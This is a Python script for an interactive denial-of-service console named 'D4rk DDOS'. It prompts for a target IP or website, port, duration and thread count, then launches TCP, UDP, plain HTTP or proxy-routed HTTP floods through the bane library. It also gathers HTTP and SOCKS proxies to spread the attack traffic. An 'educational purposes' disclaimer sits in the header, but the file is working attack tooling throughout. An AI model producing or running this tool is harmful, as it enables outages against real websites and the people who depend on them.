#!/bin/python3

#---------------------------------------------------------------------------------------------#
# Coded By - d4rk sh4d0w 	[+] Only use for eduational purposes														         															  	
#																	 																							 
# Hello s0u1 :)
#  
# Bane Module Credit Goes to - Ala 
#---------------------------------------------------------------------------------------------#


import pyfiglet
from colorama import Fore, Style
import time
import sys
import os

r = Fore.RED
b = Fore.BLUE
g = Fore.GREEN	
y = Fore.YELLOW
w = Fore.WHITE
m = Fore.MAGENTA
reset = Style.RESET_ALL


if (sys.platform) == "win32" or (sys.platform) == "win64":
	print(b + "[-] This Tool is For Linux Not Windows ... ")
	sys.exit()


try:
	import bane

except:
	print(r + "[!] Bane Module Not installed ...")
	print(g + "[+] Installing Bane module for you ..")
	os.system("pip3 install bane")
	print(g + "[+] Bane module installed sucessfully ..")
	print(reset)
	sys.exit()


def banner():
	header_banner = pyfiglet.figlet_format("  D4rk DDOS  ")
	os.system("clear")
	print(r , header_banner)
	print(b, "#" + "-" * 80 + "#")
	print(b, "#" + "\t\t\t[+] OS CHECK : " + g,"{}" .format(sys.platform))
	print(b, "#\t\t[+] Tool Coded By : " + g ,  "d4rk sh4d0w ")
	print(b , "#\t\t[+] Follow d4rk sh4d0w at github : " + g , "https://github.com/d4rkconsole")
	print(b, "# [+] DDOS ATTACK TOOLKIT ALL DDOS TCP/UDP/HTTPFLOOD . HTTPFLOOD WITH PROXIES AND MORE ")
	print(b, "#\t\t[+] Bane Module Credit Goes to : " + g , "ala,s0u1")
	print(b, "#\t\t[!] NOTE:" + r , "Type help Command in Console To show HELP MENU")
	print(b, "#" + "-" * 80 + "#")
	print(reset)




banner()

while True:
	console = input(Fore.CYAN + "d4rksh4d0w@console ~ : ")
	print(reset)
	if console == "help":
		print(b + "ddos:" + r , "Type ddos command to show ddos help menu")
		print(b + "proxies:" + r , "Type proxies command to show proxy gathering help menu")
		print(b + "exit:" + r , "Type exit command to Exit the console ")
		print(b + "clear" + r, "Type clear command to clear the screen")

	elif console == "exit":
		print(b + "Exiting the Console Goodbye ...")
		exit()	
	elif console == "clear":
		os.system("clear")
		banner()
	elif console == "ddos":
		print(b + "tcpflood:" + r , "Type tcpflood command to do tcpflood ddos attack")
		print(b + "udpflood:" + r , "Type udpflood command to do udpflood ddos attack")
		print(b + "httpflood:" + r ,"Type httpflood command to do normal httpflood ddos attack without proxies")
		print(b + "proxyhttpflood:" + r , "Type proxyhttpflood command to do http flood attack with proxy")
		
	elif console == "proxies":
		print(b + "http_proxy:" + r , "Type http_proxy command to find http proxies")
		print(b + "socks4_proxy:" + r , "Type socks4_proxy command to find socks4 proxies")
		print(b + "socks5_proxy:" + r , "Type socks5_proxy command to find socks5 proxies")
		
	elif console == "tcpflood":
		target = input(Fore.CYAN + "[+] Enter Target IP or website name  to attack : ")
		port = int(input(Fore.CYAN + "[+] Enter Port Number : "))
		time = int(input(Fore.CYAN + "[+] Enter Time Duration for attack : "))
		th = int(input(Fore.CYAN + "[+] Enter Number of Threads : "))
		print(r + "[+] Attack Started TARGET  ->> {}" .format(target))
		bane.tcp_flood(target, p=port, min_size=10, max_size=20, interval=0.001, threads=th, timeout=time, logs=True)
	elif console == "udpflood":
		ip = input(Fore.CYAN + "[+] Enter Target IP or website name  to attack :")
		po = int(input(Fore.CYAN + "[+] Enter Port Number : "))
		th = int(input(Fore.CYAN + "[+] Enter Time Duration for attack : "))
		print(r + "[+] Attack Started TARGET  ->> {}" .format(ip))
		bane.udp_flood(ip, p=po, min_size=10, max_size=20, interval=0.001, timeout=th, logs=True)
	elif console == "httpflood":
		ip = input(Fore.CYAN + "[+] Enter Target IP or website name  to attack :")
		po = int(input(Fore.CYAN + "[+] Enter Port Number : "))
		th = int(input(Fore.CYAN + "[+] Enter Time Duration for attack : "))
		threading = int(input(Fore.CYAN + "[+] Enter number of Threads : "))
		print(r + "[+] Attack Started TARGET  ->> {}" .format(ip))
		bane.http_spam(ip, p=po, interval=0.001, threads=threading, timeout=th, logs=True)
	elif console == "proxyhttpflood":
		target = input(Fore.CYAN + "[+] Enter Target IP or website name  to attack : ")
		port = int(input(Fore.CYAN + "[+] Enter Port Number : "))
		time = int(input(Fore.CYAN + "[+] Enter Time Duration for attack : "))
		th = int(input(Fore.CYAN + "[+] Enter Number of Threads : "))
		print(r + "[+] Attack Started TARGET  ->> {}" .format(target))
		bane.prox_http_spam(target, p=port, interval=0.001, threads=th, timeout=time, logs=True)
	elif console == "http_proxy":
		number = input(r + "[+] How many http proxy you want : ")
		print(r + "[+] Finding Http proxies ...")
		print(reset)
		a = bane.masshttp(int(number))
		print(a)
	
	elif console == "socks4_proxy":
		no = input(r + "[+] How many socks4 proxy you want : ")
		print(r + "[+] Finding socks4 proxies ..")
		print(reset)
		proxy = bane.massocks4(int(no))
		print(proxy)
	elif console == "socks5_proxy":
		no = input(r + "[+] How many socks5 proxy you want : " )
		print(r + "[+] Finding socks5 proxies ..")	
		print(reset)
		proxy = bane.massocks5(int(no))
		print(proxy)
	else:
		print(b + "[!] Enter Correct Command . Type help command to see help menu")
		print(reset)	




			







	





	











